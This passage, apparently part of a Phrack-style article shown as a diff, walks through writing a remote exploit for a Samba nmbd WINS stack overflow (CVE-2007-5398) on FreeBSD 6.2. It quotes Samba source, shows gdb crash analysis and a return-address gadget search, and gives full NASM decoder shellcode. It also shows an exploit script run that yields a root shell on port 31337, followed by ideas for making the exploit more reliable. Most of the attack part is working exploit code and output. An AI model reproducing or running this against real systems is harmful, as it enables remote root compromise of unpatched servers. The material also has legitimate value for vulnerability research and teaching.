+ 316        safe_strcpy(&buf[offset+1],name->scope,sizeof(name->scope))  ;
+ 317 
+ 318                 p = &buf[offset+1];
+ 319                 while ((p = strchr_m(p,'.'))) {
+ 320                         buf[offset] = PTR_DIFF(p,&buf[offset+1]);
+ 321                         offset += (buf[offset] + 1);
+ 322                         p = &buf[offset+1];
+ 323                 }
+ 324                 buf[offset] = strlen(&buf[offset+1]);
+ 325         }
+ 326 
+ 327         return(ret);
+ 328 }
+ 329 
+--------------------------------------------
+
+
+And put_name():
+
+--------------------------------------------
+ 262 /*************************************************************     **
+ 263  Put a netbios name, padding(s) and a name type into a 16 character 
+      buffer.
+ 264  name is already in DOS charset.
+ 265  [15 bytes name + padding][1 byte name type].
+ 266 **************************************************************     */
+ 267 
+ 268 void put_name(char *dest, const char *name, int pad, 
+                   unsigned int name_type     )
+ 269 {
+ 270         size_t len = strlen(name);
+ 271 
+ 272      memcpy(dest, name, (len < MAX_NETBIOSNAME_LEN) ? 
+                  len : MAX_NETBIOSN     AME_LEN - 1);
+ 273         if (len < MAX_NETBIOSNAME_LEN - 1) {
+ 274               memset(dest + len, pad, MAX_NETBIOSNAME_LEN - 1 - len);
+ 275         }
+ 276         dest[MAX_NETBIOSNAME_LEN - 1] = name_type;
+ 277 }
+ 278 
+--------------------------------------------
+
+So it appears with a large enough request, we can overflow the second 
+char buf[1024]; in send_packet(), but due to stack cookies that may not
+get us much.
+
+Indeed, after a bit of experimenting, it looks like this is not exploitable
+out of the box on Ubuntu, due to propolice/SSP, and the later code flow
+does not appear to provide us with a mechanism where we can write to other 
+memory we can control, unfortunately. That said, I may of missed something
+obvious, or I might not of understood something correctly. If anyone has 
+anything to the contrary, I would appreciate it.
+
+Since the majority of other popular Linux platforms support SSP, I
+decided to take a look at FreeBSD's CURRENT platform, and see if that would
+be vulnerable/exploitable, and by a quick objdump on the nmbd binary, it
+appears to be. I was quite disappointed to learn that after experimenting 
+with triggering the vulnerability, that it didn't appear to be exploitable,
+due to stack cookies. (At least, with my current knowledge and 
+understanding, and sans bugs in the stack cookie check failure).
+
+For what it's worth, apparently OpenBSD and DragonFly BSD both use SSP and
+other security mechanisms.. but I hardly ever do anything on *BSD work, 
+and don't overly care what they're doing (or lack thereof)
+
+--[ 5 - Writing an exploit for Samba Version 3.0.23c on FreeBSD 6.2
+
+--[ 5.1 - Verifying valid registration flags
+
+To correctly exploit the nmbd daemon, we'll need to control the stack 
+layout with precision. Reviewing how the data is laid out, we see that 
+the flags parameter is used with what the host registered with. Due to 
+potential restrictions, we need to validate what ranges are valid and can 
+be used. 
+
+By doing some quick grepping of the samba source code, we find the below 
+code which modifies the flags:
+
+--------------------------------------------
+nmbd_packets.c:
+
+uint16 get_nb_flags(char *buf)
+{
+        return ((((uint16)*buf)&0xFFFF) & NB_FLGMSK);
+}
+
+../include/nameserv.h:#define NB_FLGMSK 0xE0
+
+nmbd_winserver.c:
+void wins_process_name_registration_request(struct subnet_record *subrec,
+                                            struct packet_struct *p)
+{
+	...
+        if(registering_group_name && (question->name_type != 0x1c)) {
+                from_ip = *interpret_addr2("255.255.255.255");
+        }
+	...
+
+--------------------------------------------
+
+From the above, we see what the only certain bits set in the request flags 
+is valid, and depending on what those bits are, that they can modify the ip
+address associated with the register request. To keep things extremely 
+simple, we will stick with using 0x0000 as the flags, and work out whatever
+issues that brings us.
+
+--[ 5.2 - Ordering the stack data correctly
+
+Samba stores NMB registrations in the tdb[4] format, a database backend
+designed by the Samba team to prevent re-implementing the same code several
+times throughout Samba.
+
+Due to the mechanisms that tdb uses, the way that nmbd returns our
+registered flags and ip addresses are not necessarily in order that we
+registered them. Further analysis reveals that we force a particular 
+layout in order to exploit it correctly.
+
+Looking at how names are looked up, we see:
+
+--------------------------------------------
+nmbd_winsserver.c:
+
+static void process_wins_dmb_query_request(struct subnet_record *subrec,
+                                           struct packet_struct *p)
+{
+	...
+        fetch_all_active_wins_1b_names();
+	...
+
+void fetch_all_active_wins_1b_names(void)
+{
+        tdb_traverse(wins_tdb, fetch_1b_traverse_fn, NULL);
+}
+
+/***********************************************************************
+ Fetch all *<1b> names from the WINS db and store on the namelist.
+***********************************************************************/
+
+static int fetch_1b_traverse_fn(TDB_CONTEXT *tdb, TDB_DATA kbuf, TDB_DATA 
+                                dbuf, void *state)
+{
+        struct name_record *namerec = NULL;
+
+        if (kbuf.dsize != sizeof(unstring) + 1) {
+                return 0;
+        }
+
+        /* Filter out all non-1b names. */
+        if (kbuf.dptr[sizeof(unstring)] != 0x1b) {
+                return 0;
+        }
+
+        namerec = wins_record_to_name_record(kbuf, dbuf);
+        if (!namerec) {
+                return 0;
+        }
+
+        DLIST_ADD(wins_server_subnet->namelist, namerec);
+        return 0;
+}
+--------------------------------------------
+
+fetch_all_active_wins_1b_names() just calls tdb_traverse() with a call
+back function of fetch_1b_traverse_fn(), which adds it to a temporary name
+cache storage, at the top of a doubly linked list.
+
+Looking at tdb_traverse(), it calls tdb_traverse_internal(), which is
+where the majority of the work gets done. At this stage, it is probably 
+easier to look at how data gets stored to the database, which happens in
+tdb_store().
+
+--------------------------------------------
+/* store an element in the database, replacing any existing element
+   with the same key 
+
+   return 0 on success, -1 on failure
+*/
+int tdb_store(struct tdb_context *tdb, TDB_DATA key, TDB_DATA dbuf, 
+              int flag)
+{
+
+...
+
+/* find which hash bucket it is in */
+hash = tdb->hash_fn(&key);
+if (tdb_lock(tdb, BUCKET(hash), F_WRLCK) == -1)
+	return -1;
+
+...
+
+nmbd/nmbd_processlogon.c:tdb = tdb_open_log(lock_path("connections.tdb"),0,
+nmbd/nmbd_winsserver.c:   wins_tdb = tdb_open_log(lock_path("wins.tdb"), 0,
+                     TDB_DEFAULT|TDB_CLEAR_IF_FIRST, O_CREAT|O_RDWR, 0600);
+
+
+tdb_private.h:#define BUCKET(hash) ((hash) % tdb->header.hash_size)
+
+struct tdb_context *tdb_open(const char *name,int hash_size, int tdb_flags,
+      int open_flags, mode_t mode)
+
+...
+
+if (hash_size == 0)
+	hash_size = DEFAULT_HASH_SIZE;
+
+tdb_private.h:#define DEFAULT_HASH_SIZE 131        
+--------------------------------------------
+
+From this, we can see that we need to use the hash_fn() (which defaults to
+default_tdb_hash()) , and then we need to modulus the hash result by
+DEFAULT_HASH_SIZE. By generating names that hash to 130, we can put our 
+data in order on the stack, after every already existing 0x1b 
+registrations. Before exploitation, we need to see how many existing 0x1b 
+registrations exist, so that the stack can be overflowed correctly.
+
+This reminds me of the Algorithmic Complexity attacks, outlined
+here [5]. Not directly related, but still interesting none the less.
+
+--[ 5.3 - Code execution analysis
+
+By triggering the vulnerability and examining the stack layout, we see that
+saved eip can be partially overwritten, with two bytes. If we overwrite 
+once more, the top two bytes of eip will be the two flag bytes, and 
+overwrite the first argument to the function. After the overwrite the value
+of orig_packet, the nmbd code will index into it, to copy a 4 byte value, 
+as seen below.
+
+--------------------------------------------
+nmbd_packets.c, send_reply_packet():
+ 973         packet.fd = orig_packet->fd;
+--------------------------------------------
+
+So far in the analysis, a partial overwrite of the two least significant 
+bytes of eip seems to be the best course of action, as it's unlikely we can 
+put anything useful in the top two bytes (due to the flags). Causing an 
+overwrite of the least significant bytes with "D"'s, show:
+
+--------------------------------------------
+Program received signal SIGSEGV, Segmentation fault.
+0x08074444 in packet_is_for_wins_server ()
+(gdb) x/10i $eip
+0x8074444 <packet_is_for_wins_server+236>:     mov    0x400(%ebx),%eax
+0x807444a <packet_is_for_wins_server+242>:     mov    (%eax),%eax
+0x807444c <packet_is_for_wins_server+244>:     cmpl   $0x9,(%eax)
+0x807444f <packet_is_for_wins_server+247>:     jle    0x80743a1
+<packet_is_for_wins_server+73>
+0x8074455 <packet_is_for_wins_server+253>:     push   $0x1fa
+0x807445a <packet_is_for_wins_server+258>:     lea    0xfffd66ad(%ebx),%eax
+0x8074460 <packet_is_for_wins_server+264>:     push   %eax
+0x8074461 <packet_is_for_wins_server+265>:     lea    0xfffd6479(%ebx),%eax
+0x8074467 <packet_is_for_wins_server+271>:     push   %eax
+0x8074468 <packet_is_for_wins_server+272>:     push   $0xa
+(gdb) i r ebx
+ebx            0x0      0
+(gdb) i r  
+eax            0x1      1
+ecx            0x2834fd80       674561408
+edx            0x40     64
+ebx            0x0      0
+esp            0xbfbfe540       0xbfbfe540
+ebp            0x44440000       0x44440000
+esi            0x0      0
+edi            0x41414141       1094795585
+eip            0x8074444        0x8074444
+eflags         0x10282  66178
+cs             0x33     51
+ss             0x3b     59
+ds             0x3b     59
+es             0x3b     59
+fs             0x3b     59
+gs             0x1b     27
+--------------------------------------------
+
+We can see that we can completely control edi and to a lesser extent ebp.
+
+Looking at the disassembly of the applicable epilogue of the
+reply_netbios_packet() function, we see:
+
+--------------------------------------------
+.text:0806D0A0                 pop     edi
+.text:0806D0A1                 leave
+.text:0806D0A2                 retn
+--------------------------------------------
+
+To gain complete control of eip, we can look for a jmp edi or push edi ;
+ret. After some searching in 0x0807xxxx, a suitable instruction sequence 
+is found (via incredibly lame means.. but it worked :p): 
+
+--------------------------------------------
+freebsd62# objdump -d nmbd | egrep -i "^ 807.*57 c[23]"
+ 80728a4:       e8 57 c2 04 00          call   80beb00 <x_fclose>
+--------------------------------------------
+
+which translates into a push edi ; ret 0x04. By setting our last two bytes
+to 0x080728a5, we can get direct control:
+
+--------------------------------------------
+(gdb) r
+Starting program: /usr/local/sbin/nmbd -F -s smb.conf
+(no debugging symbols found)...(no debugging symbols found)...(no debugging
+symbols found)...(no debugging symbols found)...(no debugging symbols
+found)...(no debugging symbols found)...(no debugging symbols found)...(no
+debugging symbols found)...(no debugging symbols found)...(no debugging
+symbols found)...y
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+--------------------------------------------
+
+From this point of time, we need to get shellcode running correctly. 
+Thinking back to how the data is laid out ([2 byte flags, both null][4 byte 
+ip address]).. it's probably the best approach to write a custom decoder.
+
+--[ 5.4 - Shellcode
+
+As discussed above, a special decoder would be needed so what we can use
+generic shellcode available, as opposed to porting common shellcode to 
+account for 1/3 of the bytes being rubbish.
+
+After experimenting, I wrote a shellcode that would reconstruct 4 bytes, 
+then skip two bytes, then jump to the place where we re-constructed the 
+shellcode.
+
+Shellcode is as follows (nasm -f bin first_layer_sc.asm -o
+first_layer_sc.bin to compile.). At entry of the shellcode, edi points to
+our current eip.
+
+--------------------------------------------
+BITS 32
+
+%define tbnop add byte [eax],0x0	; 0x80 0x00 0x00
+
+_start:
+        add [eax], al		; two byte nulls, for flags.
+
+        cld			; reset direction flag
+        mov eax, edi            ; since our two byte nop dereferences [eax]
+				; we need a writable memory location.
+
+        tbnop			
+
+        mov esi, edi            ; ESI = source of encoded shellcode
+        nop
+
+        tbnop
+
+        add esi, byte 60        ; increment esi to start of real shellcode
+
+        tbnop
+
+        mov edi, esp            ; Place we're going to execute
+        nop
+
+        tbnop 
+
+        xor ecx, ecx
+        nop
+
+        tbnop
+
+        mov cl, byte 0x7e	; how many bytes we want to copy. Can copy up
+				; 126 bytes or so. This can be fixed if
+				; nessessacy
+        nop
+        tbnop
+
+.copier:
+        movsd
+        nop 
+        nop
+        tbnop
+
+        add esi, byte 0x02
+        tbnop
+
+        loopnz .copier
+.ready:
+        jmp esp
+--------------------------------------------
+
+For the second layer shellcode, we can use any shellcode we want. For
+additional flexibility, I have used the InlineEgg [6] package to
+allow for greater flexibility in the second layer shellcode. 
+
+Encoding the shellcode for registration packets is extremely straight 
+forward. Change the endian / ordering of 4 bytes and append 2 NULL bytes.
+
+Ideally, the second layer shellcode would encode the shell registration
+information over the existing socket / fd information, using the nmb 
+protocol.
+If it where a more useful exploit, it would be worth while expending the
+effort to write the required code.
+
+--[ 5.5 - Getting a shell
+
+By combining the above information, and determining where in the stack the
+shellcode lies, we can get a shell:
+
+--------------------------------------------
+[target machine]
+(gdb) shell rm /var/db/samba/wins.*
+(gdb) r
+Starting program: /usr/local/sbin/nmbd -F -s smb.conf
+(no debugging symbols found)...(no debugging symbols found)...(no debugging
+symbols found)...(no debugging symbols found)...(no debugging symbols
+found)...(no debugging symbols found)...(no debugging symbols found)...(no
+debugging symbols found)...(no debugging symbols found)...(no debugging
+symbols found)...
+Program received signal SIGTRAP, Trace/breakpoint trap.
+Cannot remove breakpoints because program is no longer writable.
+It might be running in another process.
+Further execution is probably impossible.
+0x28065af0 in ?? ()
+(gdb) # This happened because our nmbd executed a new program
+(gdb) c
+
+[attacking machine]
+$ python CVE-2007-5398.py --host 172.16.178.128 --target 0 
+Hit y if you want to test registration flags, otherwise just hit enter> 
+Existing registrations:  0
+Amount of registrations to reach EIP:  239
+Got 0 existing registrations. Hit any key to continue... 
+First layer of shellcode is 66 bytes long
+Second layer of shellcode is 246 bytes long
+Names: |==========================================================| 100.00
+Registering: |====================================================| 100.00
+stack left over: 
+Please hit enter to send final packet... 
+Attempting to connect to 172.16.178.128:31337
+ -------------------------------------------
+You are in luck; it appears to of worked... shell below.
+--
+# It worked
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 5(operator)
+# uname -a
+FreeBSD freebsd62 6.2-RELEASE FreeBSD 6.2-RELEASE #0: Fri Jan 12 10:40:27 
+2007     root@dessler.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+--------------------------------------------
+
+So, with a bunch of research and analysis, we're only part way there. It 
+would be nice to have a better place to return to. 
+
+--[ 5.6 - Making the exploit more reliable
+
+Currently, our exploit has two hard coded entries, the first of which is 
+the location of a sequence of code which uses edi to gain code execution 
+(so far, 0x080728a5 (for our current target of FreeBSD 6.2). Additionally, 
+it uses the exact location of the start of the shellcode. Due to various 
+reasons, the stack address can change easily for such an exact address, due 
+to reasons such as:
+
+ * Starting or restarting nmbd manually
+ * Differing environmental strings
+ * In later Linux 2.6 series, memory randomisation is enabled by default, 
+   for certain mappings.
+
+There are a couple of opportunities to make this exploit more reliable, 
+such as adding large nop sequences, or perhaps putting / finding some 
+suitable code elsewhere.
+
+The larger nop sequence may help, but 1/3 of the bytes are NULL / not 
+useful, so it is debatable. Additionally, this means if the range was 
+accurate, we have only a 2/3 chance of hitting a suitable nop sequence, as 
+opposed to outright crashing (as "\x00\x00" encodes to add [eax], al, and 
+since eax will be one (1) when the nop sequence is hit, it will crash.) So, 
+for the time being we will look for another place / way to gain reliable 
+execution control.
+
+--[ 5.6.1 - static .bss data
+
+While analysing this vulnerability, I noticed an interesting function that
+gets called when sending registration packets:
+
+--------------------------------------------
+nmbd/nmbd_winsserver.c:
+
+/*************************************************************************
+ Overwrite or add a given name in the wins.tdb.
+*************************************************************************/
+
+static BOOL store_or_replace_wins_namerec(const struct name_record *namerec
+                                          ,int tdb_flag)
+{
+        TDB_DATA key, data;
+        int ret;
+
+        if (!wins_tdb) {
+                return False;
+        }
+
+        key = name_to_key(&namerec->name);
+        data = name_record_to_wins_record(namerec);
+
+        if (data.dptr == NULL) {
+                return False;
+        }
+
+        ret = tdb_store(wins_tdb, key, data, tdb_flag);
+
+        SAFE_FREE(data.dptr);
+        return (ret == 0) ? True : False;
+}
+
+...
+
+/*************************************************************************
+ Create key. Key is UNIX codepage namestring (usually utf8 64 byte len) 
+ with 1 byte type.
+*************************************************************************/
+
+static TDB_DATA name_to_key(const struct nmb_name *nmbname)
+{
+        static char keydata[sizeof(unstring) + 1];
+        TDB_DATA key;
+
+        memset(keydata, '\0', sizeof(keydata));
+
+        pull_ascii_nstring(keydata, sizeof(unstring), nmbname->name);
+        strupper_m(keydata);
+        keydata[sizeof(unstring)] = nmbname->name_type;
+        key.dptr = keydata;
+        key.dsize = sizeof(keydata);
+
+        return key;
+}
+--------------------------------------------
+
+The most interesting about the above is the static char
+keydata[sizeof(unstring) + 1]; which gives us the ability to put upto 64
+bytes into a static location in the .bss. However, since NetBIOS names are
+15 chars long, there is still a lot of code that could be put here. Some
+information on small shellcodes to find things can be found here [7]
+
+name_to_key() is called from three locations in the code, with self
+explaining names (not including the above store_or_replace_wins_namerec():
+
+--------------------------------------------
+/*************************************************************************
+ Delete a given name in the tdb and remove the temporary malloc'ed data 
+ struct on the linked list.
+*************************************************************************/
+
+BOOL remove_name_from_wins_namelist(struct name_record *namerec)
+{
+
+...
+
+struct name_record *find_name_on_wins_subnet(const struct nmb_name *nmbname
+                                             ,BOOL self_only)
+{
+...
+
+--------------------------------------------
+
+Of interest is the store_or_replace_wins_namerec() which is called when 
+sending the registration packets to trigger the overflow. We may be able to
+send a suitable, short, shellcode that finds our loader shellcode in the
+stack (or, with more effort, on the heap, thus avoiding Openwall style
+non-executable stack patches).
+
+Being able to use this static location gives us some advantages over stack
+randomisation / changes. 
+
+Looking further into pull_ascii_nstring() we see that it does DOS code page
+mappings to UNIX code pages, especially relating to bytes with high bits
+installed. Unfortunately, it heavily mangles the input (via the translation
+phase), then performs an uppercase operation on the string. I experimented
+with the above restrictions and was not get anything working, but it went 
+over the length restriction. The idea worked on:
+
+ * push esp
+ * pop ebp
+ * push edi
+ * pop esp
+ * using pop to access the code we're executing
+ * using the charcase conversion to get 4 bytes with the most significant
+   bit set from 1 byte.
+ * using xor [edi+index], reg to modify the applicable code we're executing
+   ,then to do something equivilent to sub ebp, <offset> ; jmp ebp
+
+If anyone works out a suitable shellcode that fits in those restrictions, I
+would definately be interested in hearing from you. I suspect given more 
+time / motivation something would come up, and in hindsight would be a 
+"that's obvious" case. Additionally, we can control the contents of the top 
+two bytes of ebp, which may be useful in some way for coding the shellcode. 
+Possibly something like:
+
+ * push ebp
+ * inc esp ; skip over null byte
+ * inc esp 
+ * byte with high bit set that gets translated into a 0xc3 (ret
+   instruction)
+ * What two arbitrary bytes it executes has to be chosen carefully. A jmp
+   sled backwards may work, but certain data structures can not be modified
+   randomly as nmbd will crash before code execution takes place.
+
+Another potential static address we could use is the following:
+
+--------------------------------------------
+libsmb/nmblib.c:
+
+1123 static unsigned char sort_ip[4];
+1124 
+1125 /*********************************************************************
+1126  Compare two query reply records.
+1127 *********************************************************************/
+1128 
+1129 static int name_query_comp(unsigned char *p1, unsigned char *p2)
+1130 {
+1131         return matching_quad_bits(p2+2, sort_ip) - 
+                     matching_quad_bits(p1+2, sort_ip);
+1132 }
+1133 
+1134 /*********************************************************************
+1135  Sort a set of 6 byte name query response records so that the IPs that
+1136  have the most leading bits in common with the specified address come 
+      first.
+1137 *********************************************************************/
+1138 
+1139 void sort_query_replies(char *data, int n, struct in_addr ip)
+1140 {
+1141         if (n <= 1)
+1142                 return;
+1143 
+1144         putip(sort_ip, (char *)&ip);
+1145 
+1146         qsort(data, n, 6, QSORT_CAST name_query_comp);
+1147 }
+--------------------------------------------
+
+which is reachable from nmbd/nmbd_winsserver.c:
+
+--------------------------------------------
+1831 void send_wins_name_query_response(int rcode, struct packet_struct *p,
+1832                                           struct name_record *namerec)
+1833 {
+1834         char rdata[6];
+1835         char *prdata = rdata;
+1836         int reply_data_len = 0;
+1837         int ttl = 0;
+1838         int i;
+1839 
+1840         memset(rdata,'\0',6);
+1841 
+1842         if(rcode == 0) {
+1843                 ttl = (namerec->data.death_time != PERMANENT_TTL) ?  
+          namerec->data.death_time - p->timestamp : lp_max_wi     ns_ttl();
+1844 
+1845               /* Copy all known ip addresses into the return data. */
+1846               /* Optimise for the common case of one IP address so we
+                      don't need a malloc. */
+1847 
+1848                 if( namerec->data.num_ips == 1 ) {
+1849                         prdata = rdata;
+1850                 } else {
+1851                         if((prdata = (char *)
+                       SMB_MALLOC( namerec->data.num_ips * 6 )) == NULL) {
+1852          DEBUG(0,("send_wins_name_query_response: malloc fail !\n"));
+1853                                 return;
+1854                         }
+1855                 }
+1856 
+1857                 for(i = 0; i < namerec->data.num_ips; i++) {
+1858                     set_nb_flags(&prdata[i*6],namerec->data.nb_flags);
+1859                 putip((char *)&prdata[2+(i*6)], &namerec->data.ip[i]);
+1860                 }
+1861 
+1862                 sort_query_replies(prdata, i, p->ip);
+1863                 reply_data_len = namerec->data.num_ips * 6;
+1864         }
+1865 
+
+
+--------------------------------------------
+
+But I have not explored this path fully, but I don't think it would help 
+too much.
+
+After looking over what could be done with such restrictions, I started
+looking around the code to see if there was any easier mechanisms that 
+would give assistance in exploiting this issue reliably. I noticed a couple 
+of static buffers that could be useful, but they required debugging to be
+enabled to be exploited correctly - not exactly a good requirement for a 
+reliable exploit.
+
+--[ 5.6.2 - Memory leak
+
+During the initial process of attempting to replicate the issue, I noticed
+that nmbd would attempt to read from memory that we control - perhaps we 
+can find a memory leak / information disclosure that is useful. Starting 
+off with setting all normally NULL IP address to AABB, we see the first 
+crash:
+
+--------------------------------------------
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /usr/local/sbin/nmbd -F -s smb.conf 
+Program received signal SIGSEGV, Segmentation fault.
+0x080adc67 in debug_nmb_res_rec ()
+(gdb) bt
+#0  0x080adc67 in debug_nmb_res_rec ()
+#1  0x080ae023 in debug_nmb_packet ()
+#2  0x0806d1f8 in reply_netbios_packet ()
+#3  0x080728a5 in write_browse_list ()
+Previous frame inner to this frame (corrupt stack?)
+(gdb) x/10i $eip
+0x80adc67 <debug_nmb_res_rec+47>:  mov    0x60(%edx),%ecx
+0x80adc6a <debug_nmb_res_rec+50>:  test   %ecx,%ecx
+0x80adc6c <debug_nmb_res_rec+52>:  je     0x80add89 <debug_nmb_res_rec+337>
+0x80adc72 <debug_nmb_res_rec+58>:  cmp    $0xffffff9c,%edx
+0x80adc75 <debug_nmb_res_rec+61>:  je     0x80add89 <debug_nmb_res_rec+337>
+0x80adc7b <debug_nmb_res_rec+67>:  cmp    $0x0,%ecx
+0x80adc7e <debug_nmb_res_rec+70>:  movl   $0x0,0xffffffe8(%ebp)
+0x80adc85 <debug_nmb_res_rec+77>:  jle    0x80add89 <debug_nmb_res_rec+337>
+0x80adc8b <debug_nmb_res_rec+83>:  mov    0x400(%ebx),%eax
+0x80adc91 <debug_nmb_res_rec+89>:  mov    %eax,0xffffffe0(%ebp)
+(gdb) i r edx ecx
+edx            0x41414242       1094795842
+ecx            0x42420000       1111621632
+(gdb) bt
+#0  0x080adc67 in debug_nmb_res_rec ()
+#1  0x080ae023 in debug_nmb_packet ()
+#2  0x0806d1f8 in reply_netbios_packet ()
+#3  0x080728a5 in write_browse_list ()
+--------------------------------------------
+
+Starting our analysis at debug_nmb_packet() in libsmb/nmblib.c: 
+
+--------------------------------------------
+ 103 
+ 104 /********************************************************************
+ 105  Process a nmb packet.
+ 106 ********************************************************************/
+ 107 
+ 108 void debug_nmb_packet(struct packet_struct *p)
+ 109 {
+ 110         struct nmb_packet *nmb = &p->packet.nmb;
+ 111 
+ 112         if( DEBUGLVL( 4 ) ) {
+...
+ 131         }
+ 132 
+ 133         if (nmb->header.qdcount) {
+ 134       DEBUGADD( 4, ( "    question: q_name=%s q_type=%d q_class=%d\n",
+...
+ 138         }
+ 139 
+ 140         if (nmb->answers && nmb->header.ancount) {
+ 141                 debug_nmb_res_rec(nmb->answers,"answers");
+ 142         }
+ 143         if (nmb->nsrecs && nmb->header.nscount) {
+ 144                 debug_nmb_res_rec(nmb->nsrecs,"nsrecs");
+ 145         }
+ 146         if (nmb->additional && nmb->header.arcount) {
+ 147                 debug_nmb_res_rec(nmb->additional,"additional");
+ 148         }
+ 149 }
+
+(gdb) frame 1
+#1  0x080ae023 in debug_nmb_packet ()
+(gdb) x/8x $esp
+0xbfbfdef0:     0x00000000      0x00000000      0x4795ddfa      0x08117a40
+0xbfbfdf00:     0xbfbfe210      0x0000059a      0xbfbfe538      0x0806d1f8
+
+Let's take a guess that 0xbfbfe210 is our nmb packet:
+
+(gdb) x/x 0xbfbfe210	
+0xbfbfe210:     0x41414242
+(gdb) x/20x 0xbfbfe210
+0xbfbfe210:     0x41414242      0x42420000      0x00004141      0x41414242
+0xbfbfe220:     0x42420000      0x00004141      0x41414242      0x42420000
+0xbfbfe230:     0x00004141      0x41414242      0x42420000      0x00004141
+0xbfbfe240:     0x41414242      0x42420000      0x00004141      0x41414242
+0xbfbfe250:     0x42420000      0x00004141      0x41414242      0x42420000
+--------------------------------------------
+
+So the above analysis makes sense. We have overwritten certain data 
+structures it is looking at. Moving on, in debug_nmb_res_rec() we see: 
+
+--------------------------------------------
+  61 /*********************************************************************
+  62  Print out a res_rec structure.
+  63 *********************************************************************/
+  64 
+  65 static void debug_nmb_res_rec(struct res_rec *res, const char *hdr)
+  66 {
+  67         int i, j;
+  68 
+  69  DEBUGADD( 4, ( "    %s: nmb_name=%s rr_type=%d rr_class=%d ttl=%d\n",
+  70                 hdr,
+  71                 nmb_namestr(&res->rr_name),
+  72                 res->rr_type,
+  73                 res->rr_class,
+  74                 res->ttl ) );
+  75 
+  76         if( res->rdlength == 0 || res->rdata == NULL )
+  77                 return;
+  78 
+  79         for (i = 0; i < res->rdlength; i+= MAX_NETBIOSNAME_LEN) {
+  80                 DEBUGADD(4, ("    %s %3x char ", hdr, i));
+  81 
+  82                 for (j = 0; j < MAX_NETBIOSNAME_LEN; j++) {
+  83                         unsigned char x = res->rdata[i+j];
+  84                         if (x < 32 || x > 127)
+  85                                 x = '.';
+  86 
+  87                         if (i+j >= res->rdlength)
+  88                                 break;
+  89                         DEBUGADD(4, ("%c", x));
+  90                 }
+  91 
+  92                 DEBUGADD(4, ("   hex "));
+  93 
+  94                 for (j = 0; j < MAX_NETBIOSNAME_LEN; j++) {
+  95                         if (i+j >= res->rdlength)
+  96                                 break;
+  97                 DEBUGADD(4, ("%02X", (unsigned char)res->rdata[i+j]));
+  98                 }
+  99 
+ 100                 DEBUGADD(4, ("\n"));
+ 101         }
+ 102 }
+ 103 
+--------------------------------------------
+
+That code is not very useful at the moment. If the pointers where valid, 
+it'd work (not surprisingly).
+
+Looking at the code flow from send_packet(), (code is above), we hit some
+interesting code that we can use for an information leak.
+
+--------------------------------------------
+Starting program: /usr/local/sbin/nmbd -F -s smb.conf 
+debugging symbols found)...(no debugging symbols found)...(no debugging
+symbols found)...
+Program received signal SIGSEGV, Segmentation fault.
+0x080ada3d in put_nmb_name ()
+(gdb) bt
+#0  0x080ada3d in put_nmb_name ()
+#1  0x080ae26a in put_res_rec ()
+#2  0x080af184 in build_packet ()
+#3  0x080af236 in send_packet ()
+#4  0x0806d38a in reply_netbios_packet ()
+#5  0x080728a5 in write_browse_list ()
+Previous frame inner to this frame (corrupt stack?)
+(gdb) x/10i $eip
+0x80ada3d <put_nmb_name+49>:    repz cmpsb %es:(%edi),%ds:(%esi)
+0x80ada3f <put_nmb_name+51>:    jne    0x80adab5 <put_nmb_name+169>
+0x80ada41 <put_nmb_name+53>:    mov    0x8(%ebp),%edi
+0x80ada44 <put_nmb_name+56>:    pushl  0x50(%edi)
+0x80ada47 <put_nmb_name+59>:    push   $0x0
+0x80ada49 <put_nmb_name+61>:    pushl  0xffffffcc(%ebp)
+0x80ada4c <put_nmb_name+64>:    lea    0xffffffd8(%ebp),%eax
+0x80ada4f <put_nmb_name+67>:    push   %eax
+0x80ada50 <put_nmb_name+68>:    call   0x80ad98c <put_name>
+0x80ada55 <put_nmb_name+73>:    mov    0xffffffd4(%ebp),%edx
+(gdb) i r edi esi
+edi            0x8102db9        135278009
+esi            0x0      0
+--------------------------------------------
+
+Unfortunately, the above is crashing due to a NULL pointer dereference in
+esi when testing the contents of the name. (This piece of code is mapped to
+the check where the name is tested against '*' in put_nmb_name().)
+
+At this point of time I've decided that it is probably easier to start
+analysing the contents of reply_netbios_packet() so that I can see exactly
+what is being overwritten, where, and work out what effects it may have. 
+For this we'll use IDA Pro Standard 5.2
+
+First off, let's take a better look at what is happening in the source 
+code,  it'll help with analysis of the assembly.
+
+--------------------------------------------
+nmbd/nmbd_winsserver.c:
+ 856 /*********************************************************************
+ 857   Reply to a netbios name packet.  see rfc1002.txt
+ 858 *********************************************************************/
+ 859 
+ 860 void reply_netbios_packet(struct packet_struct *orig_packet,
+ 861          int rcode, enum netbios_reply_type_code rcv_code, int opcode,
+ 862                           int ttl, char *data,int len)
+ 863 {
+ 864         struct packet_struct packet;
+ 865         struct nmb_packet *nmb = NULL;
+ 866         struct res_rec answers;
+ 867         struct nmb_packet *orig_nmb = &orig_packet->packet.nmb;
+ 868         BOOL loopback_this_packet = False;
+ 869         int rr_type = RR_TYPE_NB;
+ 870         const char *packet_type = "unknown";
+ 871 
+ 872         /* Check if we are sending to or from ourselves. */
+ 873  if(ismyip(orig_packet->ip) && (orig_packet->port == global_nmb_port))
+ 874                 loopback_this_packet = True;
+ 875 
+ 876         nmb = &packet.packet.nmb;
+ 877 
+...
+ 965         if (data && len) {
+ 966                 nmb->answers->rdlength = len;
+ 967                 memcpy(nmb->answers->rdata, data, len);
+ 968         }
+ 969 
+...
+unfortunately, the nmb pointer is not used after line 967.
+...
+
+include/nameserv.h:
+524 
+525 struct packet_struct
+526 {
+527         struct packet_struct *next;
+528         struct packet_struct *prev;
+529         BOOL locked;
+530         struct in_addr ip;
+531         int port;
+532         int fd;
+533         time_t timestamp;
+534         enum packet_type packet_type;
+535         union {
+536                 struct nmb_packet nmb;
+537                 struct dgram_packet dgram;
+538         } packet;
+539 };
+540 
+
+..
+
+459 /* An nmb packet. */
+460 struct nmb_packet {
+461         struct {
+462                 int name_trn_id;
+463                 int opcode;
+464                 BOOL response;
+465                 struct {
+466                         BOOL bcast;
+467                         BOOL recursion_available;
+468                         BOOL recursion_desired;
+469                         BOOL trunc;
+470                         BOOL authoritative;
+471                 } nm_flags;
+472                 int rcode;
+473                 int qdcount;
+474                 int ancount;
+475                 int nscount;
+476                 int arcount;
+477         } header;
+478 
+479         struct {
+480                 struct nmb_name question_name;
+481                 int question_type;
+482                 int question_class;
+483         } question;
+484 
+485         struct res_rec *answers;
+486         struct res_rec *nsrecs;
+487         struct res_rec *additional;
+488 };
